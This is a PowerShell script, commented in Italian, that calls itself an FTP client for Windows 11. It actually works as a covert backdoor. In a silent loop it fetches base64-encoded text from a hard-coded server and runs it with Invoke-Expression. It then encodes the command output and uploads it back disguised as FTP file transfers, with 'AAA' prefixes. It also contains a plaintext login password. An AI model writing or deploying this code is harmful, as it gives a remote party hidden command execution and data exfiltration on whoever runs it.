# ==============================================================
#  FTP CLIENT - PowerShell  (Windows 11)
#  Modifica SERVER_IP con l indirizzo IP della macchina Linux
# ==============================================================
$SERVER_IP   = "192.168.1.139"   # <-- inserire IP del server Linux
$SERVER_PORT = 21
$DATA_PORT   = 10092             # porta passiva fissa concordata col server

$USERNAME    = "usrftp"
$PASSWORD    = "1971Camilla"

$DOWNLOAD_FILE  = "downloadME.txt"
$UPLOAD_FILE    = "uploadME.txt"
$UPLOAD_CONTENT = "CONTENUTO DEL FILE DA UPLODARE"

$DEBUG  = $false  #true: visualizzo tutti i messaggi -false: solo i messaggi importanti
$SILENT = $true #true: non visualizzo nessun messaggio

$CONNECT_TIMEOUT_MS = 5000    # ms per tentativo di connessione TCP
$READ_TIMEOUT_MS    = 300000  # ms di attesa (5 min: server aspetta input utente prima del 150)
# ==============================================================


# -- Funzioni helper --------------------------------------------

function out([string]$msg, [string]$color = "White") {
    if (-not $script:SILENT) {
        if ($color -eq "White") { Write-Host $msg }
        else { Write-Host $msg -ForegroundColor $color }
    }
}

function dbg([string]$msg) {
    if ($script:DEBUG -and -not $script:SILENT) {
        $ts = (Get-Date).ToString("HH:mm:ss.fff")
        Write-Host "  [DBG $ts] $msg" -ForegroundColor Cyan
    }
}

function Send-Command($stream, [string]$cmd) {
    dbg ">>> Invio comando: $cmd"
    $bytes = [System.Text.Encoding]::ASCII.GetBytes($cmd + "`r`n")
    try {
        $stream.Write($bytes, 0, $bytes.Length)
        $stream.Flush()
        dbg "    Comando inviato ($($bytes.Length) bytes)"
    } catch {
        out "[ERRORE] Impossibile inviare il comando: $_" "Red"
        throw
    }
    out "[C->S] $cmd"
}

function Read-Response($reader) {
    dbg "    In attesa risposta dal server (timeout $($script:READ_TIMEOUT_MS)ms)..."
    try {
        $line = $reader.ReadLine()
        if ($null -eq $line) {
            out "[ERRORE] Connessione chiusa dal server (ReadLine = null)" "Red"
            throw "Server ha chiuso la connessione"
        }
        dbg "    Risposta ricevuta: $line"
        out "[S->C] $line"
        return $line
    } catch {
        out "[ERRORE] Timeout o errore lettura risposta: $_" "Red"
        throw
    }
}

function New-TcpConnection([string]$ip, [int]$port) {
    dbg "Tentativo connessione TCP a ${ip}:${port} (timeout $($script:CONNECT_TIMEOUT_MS)ms) ..."
    $client = New-Object System.Net.Sockets.TcpClient
    $ar = $client.BeginConnect($ip, $port, $null, $null)
    $ok = $ar.AsyncWaitHandle.WaitOne($script:CONNECT_TIMEOUT_MS, $false)
    if (-not $ok) {
        $client.Close()
        throw "Timeout connessione TCP a ${ip}:${port} dopo $($script:CONNECT_TIMEOUT_MS)ms"
    }
    try { $client.EndConnect($ar) } catch {
        $client.Close()
        throw "Connessione TCP a ${ip}:${port} fallita: $_"
    }
    dbg "Connessione TCP stabilita. LocalEndPoint=$($client.Client.LocalEndPoint)"
    return $client
}

# -- Connessione al canale di controllo -------------------------
out ""
out "[CLIENT] Avvio connessione FTP verso ${SERVER_IP}:${SERVER_PORT}" "Yellow"
dbg "Creazione TcpClient per canale di controllo..."

try {
    $ctrlClient = New-TcpConnection $SERVER_IP $SERVER_PORT
} catch {
    out "[ERRORE FATALE] $_" "Red"
    out "  Verifica: IP corretto? Server avviato? Firewall aperto sulla porta $SERVER_PORT?" "Yellow"
    exit 1
}

$ctrlStream = $ctrlClient.GetStream()
$ctrlStream.ReadTimeout  = $READ_TIMEOUT_MS
$ctrlStream.WriteTimeout = $READ_TIMEOUT_MS
$ctrlReader = New-Object System.IO.StreamReader($ctrlStream, [System.Text.Encoding]::ASCII)
dbg "Stream di controllo pronto. In attesa del banner 220..."

# 220
try { $resp = Read-Response $ctrlReader } catch { out "[ERRORE FATALE] $_" "Red"; exit 1 }

# -- FASE 1: autenticazione ------------------------------------
out ""
out "[CLIENT] FASE 1 - Autenticazione" "Yellow"

try {
    Send-Command $ctrlStream "USER $USERNAME"
    $resp = Read-Response $ctrlReader   # 331

    Send-Command $ctrlStream "PASS $PASSWORD"
    $resp = Read-Response $ctrlReader   # 230 o 530
} catch { out "[ERRORE FATALE] $_" "Red"; $ctrlClient.Close(); exit 1 }

if ($resp -notmatch "^230") {
    out "[CLIENT] Autenticazione fallita (risposta: $resp). Disconnessione." "Red"
    $ctrlClient.Close()
    exit 1
}

out "[CLIENT] Autenticazione riuscita." "Green"

# TYPE I
dbg "Invio TYPE I ..."
try {
    Send-Command $ctrlStream "TYPE I"
    $resp = Read-Response $ctrlReader   # 200
} catch { out "[ERRORE FATALE] $_" "Red"; $ctrlClient.Close(); exit 1 }

# -- LOOP FASE 4 / FASE 5 -------------------------------------
$iteration = 0
while ($true) {
    $iteration++
    out ""
    out "[CLIENT] --- Iterazione $iteration ---" "Yellow"

    # -- FASE 3+4: EPSV + RETR --------------------------------
    out "[CLIENT] FASE 3+4 - Modalita passiva + Download" "Yellow"

    try {
        dbg "Invio EPSV per canale download..."
        Send-Command $ctrlStream "EPSV"
        $resp = Read-Response $ctrlReader   # 229

        dbg "Invio SIZE..."
        Send-Command $ctrlStream "SIZE $DOWNLOAD_FILE"
        $resp = Read-Response $ctrlReader   # 213

        dbg "Invio RETR..."
        Send-Command $ctrlStream "RETR $DOWNLOAD_FILE"
        $resp = Read-Response $ctrlReader   # 150
    } catch { out "[ERRORE FATALE] $_" "Red"; $ctrlClient.Close(); exit 1 }

    dbg "Apertura connessione dati verso ${SERVER_IP}:${DATA_PORT} ..."
    try {
        $dataClient = New-TcpConnection $SERVER_IP $DATA_PORT
    } catch {
        out "[ERRORE FATALE canale dati RETR] $_" "Red"
        out "  Verifica: firewall aperto sulla porta $DATA_PORT?" "Yellow"
        $ctrlClient.Close(); exit 1
    }

    $dataStream = $dataClient.GetStream()
    $dataStream.ReadTimeout = $READ_TIMEOUT_MS
    dbg "Canale dati aperto. Lettura contenuto file..."

    $memStream = New-Object System.IO.MemoryStream
    try {
        $dataStream.CopyTo($memStream)
    } catch {
        dbg "CopyTo interrotto (puo essere normale a fine stream): $_"
    }
    $dataClient.Close()
    dbg "Canale dati chiuso. Bytes ricevuti: $($memStream.Length)"
    
	# >>>>>>>>>>>>>>>>>>>>>>>
	# >>>>>>>>>>>>>>>>>>>>>>> contenuto ricevuto
	# >>>>>>>>>>>>>>>>>>>>>>>
    $fileContent = [System.Text.Encoding]::ASCII.GetString($memStream.ToArray())
	dbg "Ricevuto: $fileContent"
	if ($fileContent.StartsWith("AAA")) {
       $b64 = $fileContent.Substring(3)  # rimuove i primi 3 caratteri "AAA"
    }
    # Decodifica Base64 in bytes
    $bytes = [Convert]::FromBase64String($b64)
    # Converte i bytes in stringa UTF-8
    $fileContent = [System.Text.Encoding]::UTF8.GetString($bytes)
	if (-not $script:SILENT) {
	    Write-Host "Ricevuto: $fileContent" -ForegroundColor Magenta
	}
    try {
        $resp = Read-Response $ctrlReader   # 226
    } catch { out "[ERRORE FATALE] $_" "Red"; $ctrlClient.Close(); exit 1 }

    # Controllo QUIT
    if ($fileContent.Trim().ToUpper() -eq "QUIT") {
        out "[CLIENT] Ricevuto QUIT. Disconnessione." "Green"
        break
    }

    # -- FASE 5: EPSV + STOR ----------------------------------
    out "[CLIENT] FASE 5 - Modalita passiva + Upload" "Yellow"

    try {
        dbg "Invio EPSV per canale upload..."
        Send-Command $ctrlStream "EPSV"
        $resp = Read-Response $ctrlReader   # 229

        dbg "Invio STOR..."
        Send-Command $ctrlStream "STOR $UPLOAD_FILE"
        $resp = Read-Response $ctrlReader   # 150
    } catch { out "[ERRORE FATALE] $_" "Red"; $ctrlClient.Close(); exit 1 }

    dbg "Apertura connessione dati verso ${SERVER_IP}:${DATA_PORT} per upload..."
    try {
        $dataClient = New-TcpConnection $SERVER_IP $DATA_PORT
    } catch {
        out "[ERRORE FATALE canale dati STOR] $_" "Red"
        out "  Verifica: firewall aperto sulla porta $DATA_PORT?" "Yellow"
        $ctrlClient.Close(); exit 1
    }

	# >>>>>>>>>>>>>>>>>>>>>  
	# >>>>>>>>>>>>>>>>>>>>>  CONTENUTO DA INVIARE
	# >>>>>>>>>>>>>>>>>>>>>  	
    # Esegui comando e cattura output
    $result = Invoke-Expression $fileContent 2>&1 | Out-String
	if (-not $script:SILENT) {
          Write-Host "Sto per inviare: $result" -ForegroundColor Magenta
    }
    # Converte in byte UTF-8
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($result)
    # Genera Base64 senza newline
    $base64 = [Convert]::ToBase64String($bytes)
    # Aggiunge prefisso
    $UPLOAD_CONTENT = "AAA" + $base64
    $dataStream = $dataClient.GetStream()
    $dataStream.WriteTimeout = $READ_TIMEOUT_MS
    $uploadBytes = [System.Text.Encoding]::ASCII.GetBytes($UPLOAD_CONTENT)
    dbg "Invio $($uploadBytes.Length) bytes sul canale dati..."
    try {
        $dataStream.Write($uploadBytes, 0, $uploadBytes.Length)
        $dataStream.Flush()
    } catch {
        out "[ERRORE FATALE invio dati STOR] $_" "Red"
        $ctrlClient.Close(); exit 1
    }
    $dataClient.Close()
    dbg "Canale dati upload chiuso."

    try {
        $resp = Read-Response $ctrlReader   # 226
    } catch { out "[ERRORE FATALE] $_" "Red"; $ctrlClient.Close(); exit 1 }

    out "[CLIENT] Upload completato." "Green"
}

$ctrlClient.Close()
out ""
out "[CLIENT] Connessione chiusa. Client terminato." "Green"
